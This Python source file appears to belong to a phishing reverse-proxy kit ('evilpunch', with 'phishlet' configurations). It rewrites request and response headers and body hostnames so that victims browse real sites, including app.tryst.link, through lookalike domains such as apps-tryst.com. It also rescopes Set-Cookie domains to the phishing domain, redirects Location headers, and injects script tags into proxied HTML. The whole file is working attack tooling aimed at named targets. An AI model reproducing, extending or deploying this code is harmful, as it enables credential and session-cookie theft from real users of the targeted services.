


import re

def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
    """
    Process outgoing request headers (client -> target).

    - Accepts headers as a CIMultiDictProxy-like object or a plain dict.
    - Filters out cookies whose name starts with 'evilpunch' (case-insensitive).
    - PRESERVE the original User-Agent if present; otherwise use a fallback UA.
    - Sets Sec-Ch-Ua-Platform (same behavior as before).
    - Removes 'zstd' from Accept-Encoding (or sets to 'identity' if it's the only encoding).
    - If phishlet_data contains hosts_to_proxy entries with 'reverce_filter',
      apply reverse replacements from proxy_host -> original hostnames using marker-based replacement.
    - Otherwise, fallback to a simple proxy_host -> target_host string replacement across header values.
    - Logs the outgoing User-Agent.
    """
    import re

    # Convert CIMultiDictProxy-like to normal dict while preserving multi-values
    if hasattr(headers, 'getall'):
        headers_dict = {}
        for key in headers:
            values = headers.getall(key)
            if len(values) == 1:
                headers_dict[key] = values[0]
            else:
                headers_dict[key] = values
    else:
        headers_dict = headers.copy() if isinstance(headers, dict) else dict(headers)

    # --- Filter Cookie header: remove cookies whose name starts with 'evilpunch' ---
    def _filter_evilpunch_cookie(cookie_header_value):
        if not cookie_header_value:
            return None
        cookies = [c.strip() for c in cookie_header_value.split(';') if c.strip()]
        filtered = []
        for cookie in cookies:
            # cookie may be "name=value" or "name"
            name = cookie.split('=', 1)[0].strip()
            if not name.lower().startswith('evilpunch'):
                filtered.append(cookie)
        if filtered:
            return '; '.join(filtered)
        return None

    # Handle different casing of 'Cookie' header
    cookie_key = None
    for k in list(headers_dict.keys()):
        if k.lower() == 'cookie':
            cookie_key = k
            break

    if cookie_key is not None:
        filtered = _filter_evilpunch_cookie(headers_dict.get(cookie_key))
        if filtered is not None:
            headers_dict[cookie_key] = filtered
            original_count = len([c for c in (headers_dict.get(cookie_key, '') or '').split(';') if c.strip()])
            print(f"  🍪 Filtered cookies: {original_count} remaining")
        else:
            # Remove Cookie header entirely
            headers_dict.pop(cookie_key, None)
            print(f"  🍪 Removed all evilpunch cookies from request - deleted entire Cookie header")

    # --- Preserve original User-Agent if present, otherwise use fallback ---
    # find existing UA header key (case-insensitive)
    ua_key = None
    for k in list(headers_dict.keys()):
        if k.lower() == 'user-agent':
            ua_key = k
            break

    original_ua_value = headers_dict.get(ua_key) if ua_key else None

    # Fallback UA (used only when original is missing)
    fallback_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"

    if original_ua_value:
        # Preserve the original UA — don't overwrite.
        headers_dict[ua_key] = original_ua_value
        ua_value_to_log = original_ua_value
    else:
        # No original UA — set the fallback (same behavior as previous forced UA)
        headers_dict['User-Agent'] = fallback_ua
        ua_value_to_log = fallback_ua

    # Sec-Ch-Ua-Platform - set to Windows (create or replace, case-insensitive)
    sec_key = None
    for k in list(headers_dict.keys()):
        if k.lower() == 'sec-ch-ua-platform':
            sec_key = k
            break
    if sec_key:
        headers_dict[sec_key] = "Windows"
    else:
        headers_dict['Sec-Ch-Ua-Platform'] = "Windows"

    # --- Handle Accept-Encoding: remove zstd if present ---
    ae_key = None
    for k in list(headers_dict.keys()):
        if k.lower() == 'accept-encoding':
            ae_key = k
            break

    if ae_key:
        accept_encoding = headers_dict.get(ae_key, '')
        print(f"\n  🟢 Original Accept-Encoding: {accept_encoding}")
        if 'zstd' in (accept_encoding or '').lower():
            encodings = [enc.strip() for enc in accept_encoding.split(',') if enc.strip()]
            filtered_encodings = [enc for enc in encodings if 'zstd' not in enc.lower()]
            if filtered_encodings:
                headers_dict[ae_key] = ', '.join(filtered_encodings)
                print(f"  🔧 Removed zstd from Accept-Encoding: {headers_dict[ae_key]}")
            else:
                headers_dict[ae_key] = 'identity'
                print(f"  🔧 No encodings left after removing zstd, set Accept-Encoding to identity")
        else:
            print(f"  ✅ zstd not found in Accept-Encoding, keeping as is")

    # --- Reverse replacement using phishlet_data if configured ---
    def _build_replacement_map(proxy_host_param):
        repl = {}
        hosts_to_proxy = phishlet_data.get('hosts_to_proxy', []) if phishlet_data else []
        # Determine base domain from proxy_host_param (last two labels)
        base_domain = proxy_host_param
        if '.' in proxy_host_param:
            parts = proxy_host_param.split('.')
            if len(parts) >= 2:
                base_domain = '.'.join(parts[-2:])
        for host_entry in hosts_to_proxy:
            if not host_entry.get('reverce_filter', False):
                continue
            original_host = host_entry.get('host', '').strip()
            proxy_subdomain = host_entry.get('proxy_subdomain', '').strip()
            # Build proxy hostname to match
            if proxy_subdomain:
                proxy_hostname = f"{proxy_subdomain}.{base_domain}"
            else:
                proxy_hostname = base_domain
            if original_host:
                repl[proxy_hostname] = original_host
        return repl

    if phishlet_data and any(h.get('reverce_filter', False) for h in phishlet_data.get('hosts_to_proxy', [])):
        replacement_map = _build_replacement_map(proxy_host)
        # sort longest first
        sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
        # Apply marker-based single-pass replacement to each header value
        for key, value in list(headers_dict.items()):
            if isinstance(value, str):
                marked_value = value
                marker_map = {}
                for i, (proxy_hostname, original_hostname) in enumerate(sorted_replacements):
                    marker = f"__REVERSE_FILTER_MARKER_{i}__"
                    marker_map[marker] = original_hostname
                    escaped_proxy = re.escape(proxy_hostname)
                    # boundary-aware pattern
                    pattern = rf'(?<![A-Za-z0-9.-]){escaped_proxy}(?![A-Za-z0-9.-])'
                    marked_value = re.sub(pattern, marker, marked_value)
                for marker, orig in marker_map.items():
                    marked_value = marked_value.replace(marker, orig)
                headers_dict[key] = marked_value
            elif isinstance(value, (list, tuple)):
                new_vals = []
                for v in value:
                    if isinstance(v, str):
                        marked_v = v
                        marker_map = {}
                        for i, (proxy_hostname, original_hostname) in enumerate(sorted_replacements):
                            marker = f"__REVERSE_FILTER_MARKER_{i}__"
                            marker_map[marker] = original_hostname
                            escaped_proxy = re.escape(proxy_hostname)
                            pattern = rf'(?<![A-Za-z0-9.-]){escaped_proxy}(?![A-Za-z0-9.-])'
                            marked_v = re.sub(pattern, marker, marked_v)
                        for marker, orig in marker_map.items():
                            marked_v = marked_v.replace(marker, orig)
                        new_vals.append(marked_v)
                    else:
                        new_vals.append(v)
                headers_dict[key] = new_vals
    else:
        # Fallback: simple proxy_host -> target_host replacement across string values
        for key, value in list(headers_dict.items()):
            if isinstance(value, str) and proxy_host in value:
                headers_dict[key] = value.replace(proxy_host, target_host)
            elif isinstance(value, (list, tuple)):
                new_values = []
                for v in value:
                    if isinstance(v, str) and proxy_host in v:
                        new_values.append(v.replace(proxy_host, target_host))
                    else:
                        new_values.append(v)
                headers_dict[key] = new_values

    # --- Optional phishlet domain/target debug (non-fatal) ---
    if phishlet_data:
        proxy_domain = phishlet_data.get('proxy_domain', '')
        target_url = phishlet_data.get('target_url', '')
        target_domain = ''
        if target_url and '//' in target_url:
            try:
                target_domain = target_url.split('//', 1)[1].split('/')[0]
                print(f"proxy_host (phishlet): {proxy_domain}, target_host (phishlet): {target_domain}")
            except (IndexError, AttributeError):
                print(f"Warning: Could not parse target_url: {target_url}")
        else:
            print(f"Warning: Invalid target_url format in phishlet_data: {target_url}")
    else:
        # If no phishlet data, silently continue (no prints)
        pass

    # --- Log request User-Agent before returning ---
    # ua_value_to_log already set above (original UA if present, else fallback)
    print(f"\n🚀 [Request] User-Agent: {ua_value_to_log}")

    return headers_dict

def patch_headers_in(headers, proxy_host, target_host):
    """
    Process incoming response headers (target -> client).

    - Converts headers to a mutable dict form.
    - Rewrites Set-Cookie domain attributes to .apps-tryst.com (case-insensitive).
    - Appends domain if cookie has no domain attribute.
    - Rewrites Location headers pointing to app.tryst.link -> app.apps-tryst.com (preserve path).
    - Logs modified Set-Cookie and Location values.
    - Logs response User-Agent (case-insensitive lookup).
    """
    # Convert headers to a mutable dict form; preserve original value types
    if hasattr(headers, 'getall'):
        # preserve multi-values as lists
        headers_dict = {k: headers.getall(k) for k in headers}
    else:
        # copy to avoid mutating the caller's object
        headers_dict = dict(headers)

    # helper to find a header key ignoring case and return the actual key or None
    def find_key_ci(d, name):
        lname = name.lower()
        for k in list(d.keys()):
            if k.lower() == lname:
                return k
        return None

    # --- Process Set-Cookie header(s) ---
    set_cookie_key = find_key_ci(headers_dict, 'Set-Cookie')
    if set_cookie_key is not None:
        cookies = headers_dict[set_cookie_key]
        if not isinstance(cookies, list):
            cookies = [cookies]

        new_cookies = []
        for cookie in cookies:
            original_cookie = cookie
            # If cookie contains a domain attribute, replace it; else append domain
            if re.search(r'\bdomain=', cookie, flags=re.IGNORECASE):
                # replace domain=<whatever> with domain=.apps-tryst.com
                new_cookie = re.sub(r'domain=[^;]+', 'domain=.apps-tryst.com', cookie, flags=re.IGNORECASE)
            else:
                # append domain attribute (ensure doesn't duplicate trailing semicolon)
                if cookie.endswith(';'):
                    new_cookie = cookie + ' domain=.apps-tryst.com'
                else:
                    new_cookie = cookie + '; domain=.apps-tryst.com'
            new_cookies.append(new_cookie)
            print(f"[patch_headers_in] Modified Set-Cookie: {original_cookie} -> {new_cookie}")

        # store back as list if there are multiple, or single string if only one originally
        headers_dict[set_cookie_key] = new_cookies if len(new_cookies) > 1 else new_cookies[0]

    # --- Process Location header(s) ---
    location_key = find_key_ci(headers_dict, 'Location')
    if location_key is not None:
        location_value = headers_dict[location_key]

        def rewrite_location(loc):
            if not isinstance(loc, str):
                return loc
            loc_stripped = loc.strip()
            # specific exact match handling (keeps backwards compatibility)
            if loc_stripped.lower() == "https://app.tryst.link/members/providers":
                new_loc = "https://app.apps-tryst.com/members/providers"
                print(f"[patch_headers_in] Modified Location (exact): {loc} -> {new_loc}")
                return new_loc
            # more flexible replacement: replace app.tryst.link prefix with app.apps-tryst.com
            if loc_stripped.lower().startswith("https://app.tryst.link"):
                new_loc = re.sub(r"^https://app\.tryst\.link", "https://app.apps-tryst.com", loc_stripped, flags=re.IGNORECASE)
                print(f"[patch_headers_in] Modified Location (prefix): {loc} -> {new_loc}")
                return new_loc
            # no change
            return loc

        if isinstance(location_value, list):
            new_locations = []
            for loc in location_value:
                new_locations.append(rewrite_location(loc))
            headers_dict[location_key] = new_locations
        else:
            headers_dict[location_key] = rewrite_location(location_value)

    # --- Log response User-Agent (case-insensitive) ---
    ua_key = find_key_ci(headers_dict, 'User-Agent')
    ua_value = headers_dict.get(ua_key, '❌ No User-Agent header found') if ua_key else '❌ No User-Agent header found'
    print(f"\n⬅️ [Response] User-Agent: {ua_value}")

    return headers_dict


def replace_in_response(response, target_host, proxy_host):
    # For StreamResponse objects, content replacement should be done during streaming
    # The headers have already been patched in the main handler
    # No need to manipulate response.text as StreamResponse doesn't have this attribute
    return response

def replace_in_chunk(chunk, target_host, proxy_host):
    """
    Replace target_host with proxy_host in a chunk of data.
    Handles both text and binary data.
    """
    if isinstance(chunk, bytes):
        # Only try UTF-8 for consistency
        try:
            chunk_str = chunk.decode('utf-8')
            if target_host in chunk_str:
                print(f"Replacing {target_host} with {proxy_host} in chunk")
                replaced_str = chunk_str.replace(target_host, proxy_host)
                return replaced_str.encode('utf-8')
            return chunk
        except UnicodeDecodeError:
            # If it's binary data, return as-is without modification
            return chunk
    elif isinstance(chunk, str):
        if target_host in chunk:
            print(f"Replacing {target_host} with {proxy_host} in string chunk")
            return chunk.replace(target_host, proxy_host)
        return chunk

import re


def replace_in_chunk_multi(chunk, target_to_proxy_map):
    """
    Replace multiple target hosts with their proxy hosts in a chunk.
    target_to_proxy_map: Dict[str, str] mapping target_host -> proxy_host
    """
    if not isinstance(target_to_proxy_map, dict) or not target_to_proxy_map:
        return chunk
    
    if isinstance(chunk, bytes):
        try:
            chunk_str = chunk.decode('utf-8')
            replaced = False
            for target, proxy in target_to_proxy_map.items():
                if target in chunk_str:
                    chunk_str = chunk_str.replace(target, proxy)
                    replaced = True
            if replaced:
                return chunk_str.encode('utf-8')
            return chunk
        except UnicodeDecodeError:
            return chunk
    elif isinstance(chunk, str):
        replaced = False
        for target, proxy in target_to_proxy_map.items():
            if target in chunk:
                chunk = chunk.replace(target, proxy)
                replaced = True
        return chunk
    return chunk



def apply_reverse_filter_to_request_body(request_body, phishlet_data, proxy_domain):
    """
    Apply reverse filter to request body when reverce_filter is enabled.
    This replaces proxy hostnames with original hostnames in the request body.
    
    Args:
        request_body: The request body (bytes or str)
        phishlet_data: The phishlet configuration data
        proxy_domain: The proxy domain (e.g., 'xx.in')
    
    Returns:
        Modified request body with hostname replacements
    """
    if not request_body:
        return request_body
    
    # Check if phishlet_data exists before accessing its properties
    if not phishlet_data:
        return request_body
    
    # Check if reverse filter is enabled for any hosts
    hosts_to_proxy = phishlet_data.get('hosts_to_proxy', [])
    reverse_filter_enabled = any(host.get('reverce_filter', False) for host in hosts_to_proxy)
    
    if not reverse_filter_enabled:
        return request_body
    
    # Build replacement mapping: proxy_hostname -> original_hostname
    # Sort by length (longest first) to ensure specific subdomains are processed before base domains
    replacement_map = {}
    
    for host_entry in hosts_to_proxy:
        if not host_entry.get('reverce_filter', False):
            continue
            
        original_host = host_entry.get('host', '').strip()
        proxy_subdomain = host_entry.get('proxy_subdomain', '').strip()
        original_subdomain = host_entry.get('orignal_subdomain', '').strip()
        
        if not original_host:
            continue
        
        # Build the proxy hostname that should be replaced
        if proxy_subdomain:
            proxy_hostname = f"{proxy_subdomain}.{proxy_domain}"
        else:
            proxy_hostname = proxy_domain
        
        # Build the original hostname to replace with
        # Use the host field directly - it already contains the full hostname
        original_hostname = original_host
        
        replacement_map[proxy_hostname] = original_hostname
    
    # Sort by length (longest first) to ensure specific subdomains are processed before base domains
    sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
    
    if not sorted_replacements:
        return request_body
    
    # Apply replacements using a completely different approach to prevent double replacements
    if isinstance(request_body, bytes):
        try:
            body_str = request_body.decode('utf-8')
            modified_body = body_str
            
            # Use a single-pass replacement with a unique marker approach
            # This prevents any possibility of double replacements
            import re
            
            # Create a mapping with unique markers
            marker_map = {}
            marked_body = body_str
            
            # Step 1: Replace each proxy hostname with a unique marker
            for i, (proxy_hostname, original_hostname) in enumerate(sorted_replacements):
                marker = f"__REVERSE_FILTER_MARKER_{i}__"
                marker_map[marker] = original_hostname
                
                # Escape special regex characters
                escaped_proxy = re.escape(proxy_hostname)
                # Use a pattern that matches the exact hostname with proper boundaries
                pattern = rf'(?<![A-Za-z0-9.-]){escaped_proxy}(?![A-Za-z0-9.-])'
                marked_body = re.sub(pattern, marker, marked_body)
            
            # Step 2: Replace all markers with their original hostnames
            for marker, original_hostname in marker_map.items():
                marked_body = marked_body.replace(marker, original_hostname)
            
            return marked_body.encode('utf-8')
        except UnicodeDecodeError:
            # If it's binary data, return as-is without modification
            return request_body
    elif isinstance(request_body, str):
        modified_body = request_body
        
        # Use a single-pass replacement with a unique marker approach
        # This prevents any possibility of double replacements
        import re
        
        # Create a mapping with unique markers
        marker_map = {}
        marked_body = request_body
        
        # Step 1: Replace each proxy hostname with a unique marker
        for i, (proxy_hostname, original_hostname) in enumerate(sorted_replacements):
            marker = f"__REVERSE_FILTER_MARKER_{i}__"
            marker_map[marker] = original_hostname
            
            # Escape special regex characters
            escaped_proxy = re.escape(proxy_hostname)
            # Use a pattern that matches the exact hostname with proper boundaries
            pattern = rf'(?<![A-Za-z0-9.-]){escaped_proxy}(?![A-Za-z0-9.-])'
            marked_body = re.sub(pattern, marker, marked_body)
        
        # Step 2: Replace all markers with their original hostnames
        for marker, original_hostname in marker_map.items():
            marked_body = marked_body.replace(marker, original_hostname)
        
        return marked_body
    
    return request_body


def process_phishlet_filters(phishlet_data, request_path, response_status=None, debug_log=None):
    """
    Process phishlet filters and return a mapping of locate -> replace pairs.
    
    Args:
        phishlet_data: The phishlet configuration data containing filters
        request_path: The current request path for URL-specific filters
        response_status: The HTTP response status code (used for 302 redirects)
        debug_log: Optional debug logging function
    
    Returns:
        dict: Mapping of locate strings to replace strings
    """
    if not phishlet_data:
        return {}
    
    filters = phishlet_data.get('filters', [])
    if not filters:
        return {}
    
    filter_replacements = {}
    
    for filter_item in filters:
        if filter_item.get('type') == 'url':
            if filter_item.get('url') == '*':
                # Global filter - applies to all URLs
                locate = filter_item.get('locate')
                replace = filter_item.get('replace')
                if locate and replace:
                    filter_replacements[locate] = replace
                    if debug_log:
                        debug_log(f"  String replacement mapping (global): {locate} -> {replace}", "DEBUG")
            else:
                # URL-specific filter - check if it matches current request path
                filter_url = filter_item.get('url', '')
                if filter_url == request_path or filter_url in request_path:
                    locate = filter_item.get('locate')
                    replace = filter_item.get('replace')
                    if locate and replace:
                        filter_replacements[locate] = replace
                        if debug_log:
                            debug_log(f"  String replacement mapping (URL-specific): {locate} -> {replace} for path {request_path}", "DEBUG")
                else:
                    if debug_log:
                        debug_log(f"  Skipping string replacement for path {request_path} (filter URL: {filter_url})", "DEBUG")
        else:
            if debug_log:
                debug_log(f"  Skipping non-URL filter: {filter_item.get('type')}", "DEBUG")
    
    # if response status is 302 then in header Location value apply replacements
    if (response_status == 302 or response_status == 301 ) and 'Location' in filter_replacements:
        # Apply all other replacements to the Location header value
        location_value = filter_replacements['Location']
        for locate, replace in filter_replacements.items():
            if locate != 'Location' and locate in location_value:
                location_value = location_value.replace(locate, replace)
                if debug_log:
                    debug_log(f"Applied replacement to Location header: '{locate}' -> '{replace}'", "DEBUG")
        filter_replacements['Location'] = location_value
        if debug_log:
            debug_log(f"Final Location header value after replacements: {location_value}", "DEBUG")
    
    return filter_replacements


def patch_response_header_2(patched_headers, ordered_replacements, debug_log=None):
    """
    Apply additional header replacements based on ordered_replacements.
    Uses a marker-based approach to prevent double replacements.
    
    Args:
        patched_headers: Dictionary of headers to be modified
        ordered_replacements: List of tuples (target, proxy) for replacements
        debug_log: Optional debug logging function
    
    Returns:
        dict: Modified headers with replacements applied
    """
    if not ordered_replacements:
        return patched_headers
    
    if debug_log:
        debug_log(f"  Applying ordered replacements to patched headers: --------\n --------------------------------")
    
    import re
    
    for key, value in patched_headers.items():
        if not isinstance(value, str):
            continue
            
        # Use a marker-based approach to prevent double replacements
        new_value = value
        marker_map = {}
        
        # Step 1: Replace each target with a unique marker
        for i, (target, proxy) in enumerate(ordered_replacements):
            if target in new_value:
                marker = f"__HEADER_REPLACEMENT_MARKER_{i}__"
                marker_map[marker] = proxy
                new_value = new_value.replace(target, marker)
                if debug_log:
                    debug_log(f"  Replaced in patched header {key}: {target} -> {marker}", "DEBUG")
        
        # Step 2: Replace all markers with their final values
        for marker, proxy in marker_map.items():
            new_value = new_value.replace(marker, proxy)
        
        # Update the patched header if any replacements were made
        if new_value != value:
            patched_headers[key] = new_value
            if debug_log:
                debug_log(f"  Final patched header {key}: {value} -> {new_value}", "DEBUG")
    
    if debug_log:
        debug_log(f"  Applied ordered replacements to patched headers: --------\n --------------------------------")
        debug_log(f"  Final patched headers: --------\n --------------------------------")
        # debug_log(f"  {patched_headers}", "DEBUG")
        debug_log(f"  --------------------------------")
    
    return patched_headers


def create_ordered_replacements(filtered_map, target_host, debug_log=None):
    """
    Create ordered replacements list sorted by target length (longest first).
    
    Args:
        filtered_map: Dictionary of target -> proxy mappings
        target_host: The primary target host for special logging
        debug_log: Optional debug logging function
    
    Returns:
        list: List of tuples (target, proxy) sorted by target length (longest first)
    """
    # Prepare ordered replacements: ALL sorted by descending target length to ensure specific subdomains are replaced before base domains
    ordered_replacements = []  # List[Tuple[str, str]]
    
    # Add ALL mappings (including target_host) to be sorted by length
    all_mappings = [(t, p) for t, p in filtered_map.items()]
    # Sort by length in descending order so longer hostnames (like tools.fluxxset.com) are processed before shorter ones (like fluxxset.com)
    all_mappings.sort(key=lambda kv: len(kv[0]), reverse=True)
    
    for tgt, prox in all_mappings:
        ordered_replacements.append((tgt, prox))
        if debug_log:
            if tgt == target_host:
                debug_log(f"  Primary replacement: {target_host} -> {prox}", "DEBUG")
            else:
                debug_log(f"  Secondary replacement: {tgt} -> {prox}", "DEBUG")
    
    # if debug_log:
    #     # Debug: Verify the replacement order is correct
    #     debug_log(f"Final replacement order (longest first): {[(t, p) for t, p in ordered_replacements]}", "DEBUG")
        
      
        
    return ordered_replacements


def apply_content_replacements(combined, ordered_replacements, should_apply_replacements, content_type, 
                             incoming_host, request, chunk_count, debug_log=None):
    """
    Apply all content replacements including regex-based replacements, hardcoded mappings, 
    and JavaScript injection for HTML content.
    
    Args:
        combined: The content string to apply replacements to
        ordered_replacements: List of tuples (target, proxy) for replacements
        should_apply_replacements: Boolean indicating if replacements should be applied
        content_type: The content type of the response
        incoming_host: The incoming host for hardcoded mappings
        request: The request object for JavaScript injection tracking
        chunk_count: The current chunk number for logging
        debug_log: Optional debug logging function
    
    Returns:
        tuple: (modified_content, request_updated) where request_updated may have new tracking flags
    """
    if not ordered_replacements or not should_apply_replacements:
        if debug_log:
            debug_log(f"⏭️  Skipping replacements for non-text content type: {content_type}", "DEBUG")
        return combined, request
    
    import re
    
    # Step 1: Create a mapping of all replacements to apply
    replacement_map = {}
    for tgt, prox in ordered_replacements:
        if tgt and prox and tgt in combined:
            replacement_map[tgt] = prox
    
    # Step 2: Apply all replacements using regex to avoid interference
    if replacement_map:
        # Sort by length (longest first) to ensure specific subdomains are processed first
        sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
        
        if debug_log:
            debug_log(f"🔄 Applying {len(sorted_replacements)} replacements using regex for chunk {chunk_count}", "DEBUG")
        
        # Create a single regex pattern that matches all targets
        pattern_parts = []
        replacement_dict = {}
        
        for tgt, prox in sorted_replacements:
            # Escape special regex characters and add word boundaries
            escaped_target = re.escape(tgt)
            pattern_parts.append(escaped_target)
            replacement_dict[tgt] = prox
        
        # Create a single regex pattern
        if pattern_parts:
            pattern = '|'.join(pattern_parts)
            regex = re.compile(pattern)
            
            # Apply all replacements in a single operation
            old_combined = combined
            
            def replacement_function(match):
                matched_text = match.group(0)
                if matched_text in replacement_dict:
                    replacement = replacement_dict[matched_text]
                    if debug_log:
                        debug_log(f"✓ Regex replaced '{matched_text}' with '{replacement}' in chunk {chunk_count}", "INFO")
                        # Special tracking for tools.fluxxset.com replacement
                        if 'tools.fluxxset.com' in matched_text:
                            debug_log(f"🎯 SUCCESS: tools.fluxxset.com -> {replacement} replacement completed!", "INFO")
                    return replacement
                return matched_text
            
            combined = regex.sub(replacement_function, combined)
            
            # Debug: show final result
            if old_combined != combined:
                if debug_log:
                    debug_log(f"🔄 Regex replacements completed for chunk {chunk_count}", "DEBUG")
            else:
                if debug_log:
                    debug_log(f"⚠️  No replacements were made in chunk {chunk_count}", "DEBUG")
    
    # STEP 3: Apply hardcoded mappings AFTER all regex replacements are done
    # These are final cleanup replacements that should happen at the very end
    if should_apply_replacements:
        hardcoded_replacements = {}
        
        # Add hardcoded mappings for specific subdomain replacements (if applicable)
        if incoming_host == "xx.in":
            hardcoded_replacements["login.fluxxset.com"] = "login1.xx.in"
            if debug_log:
                debug_log(f"Added hardcoded mapping for final pass: login.fluxxset.com -> login1.xx.in", "DEBUG")
        
        # Apply hardcoded replacements if any exist
        if hardcoded_replacements:
            if debug_log:
                debug_log(f"🔄 Applying {len(hardcoded_replacements)} hardcoded replacements after regex", "DEBUG")
            old_combined = combined
            
            for tgt, prox in hardcoded_replacements.items():
                if tgt in combined:
                    combined = combined.replace(tgt, prox)
                    if debug_log:
                        debug_log(f"✓ Final hardcoded replacement: '{tgt}' -> '{prox}' in chunk {chunk_count}", "INFO")
            
            if old_combined != combined:
                if debug_log:
                    debug_log(f"🔄 Hardcoded replacements completed for chunk {chunk_count}", "DEBUG")
            else:
                if debug_log:
                    debug_log(f"⚠️  No hardcoded replacements were made in chunk {chunk_count}", "DEBUG")
    else:
        if debug_log:
            debug_log(f"⏭️  Skipping hardcoded replacements for non-text content type: {content_type}", "DEBUG")
    
    # STEP 4: JavaScript injection for HTML content
    # Only inject JavaScript for HTML content types and when we have script endpoints
    if (should_apply_replacements and 
        'text/html' in content_type and 
        request.get('js_script_endpoints')):
        
        script_endpoints = request.get('js_script_endpoints', [])
        if script_endpoints:
            if debug_log:
                debug_log(f"🔄 Applying JavaScript injection for {len(script_endpoints)} scripts in chunk {chunk_count}", "DEBUG")
            
            # For streaming HTML, we need to inject script tags strategically
            # Check if this chunk contains closing head tag
            if '</head>' in combined:
                if debug_log:
                    debug_log(f"🎯 Found </head> tag in chunk {chunk_count}, injecting scripts", "INFO")
                
                # Inject script tags before </head>
                script_tags = []
                for endpoint in script_endpoints:
                    script_tags.append(f'<script src="/_temp_js/{endpoint}"></script>')
                
                script_html = '\n    '.join(script_tags)
                combined = combined.replace('</head>', f'    {script_html}\n</head>')
                
                if debug_log:
                    debug_log(f"✓ Injected {len(script_endpoints)} script tags before </head>", "INFO")
                
                # Mark as injected to avoid duplicate injection
                request['js_injection_completed'] = True
            elif '</body>' in combined and not request.get('js_injection_completed'):
                # Fallback: if no </head> tag but we have </body>, inject before it
                if debug_log:
                    debug_log(f"🎯 Found </body> tag in chunk {chunk_count}, injecting scripts (fallback)", "INFO")
                
                script_tags = []
                for endpoint in script_endpoints:
                    script_tags.append(f'<script src="/_temp_js/{endpoint}"></script>')
                
                script_html = '\n    '.join(script_tags)
                combined = combined.replace('</body>', f'    {script_html}\n</body>')
                
                if debug_log:
                    debug_log(f"✓ Injected {len(script_endpoints)} script tags before </body> (fallback)", "INFO")
                request['js_injection_completed'] = True
            elif '</html>' in combined and not request.get('js_injection_completed'):
                # Final fallback: if no </head> or </body> tag but we have </html>, inject before it
                if debug_log:
                    debug_log(f"🎯 Found </html> tag in chunk {chunk_count}, injecting scripts (final fallback)", "INFO")
                
                script_tags = []
                for endpoint in script_endpoints:
                    script_tags.append(f'<script src="/_temp_js/{endpoint}"></script>')
                
                script_html = '\n    '.join(script_tags)
                combined = combined.replace('</html>', f'    {script_html}\n</html>')
                
                if debug_log:
                    debug_log(f"✓ Injected {len(script_endpoints)} script tags before </html> (final fallback)", "INFO")
                request['js_injection_completed'] = True
            else:
                if debug_log:
                    debug_log(f"⏳ No closing tags found in chunk {chunk_count}, scripts will be injected later", "DEBUG")
    else:
        if debug_log:
            debug_log(f"⏭️  Skipping JavaScript injection for non-HTML content type: {content_type}", "DEBUG")
    


    return combined, request
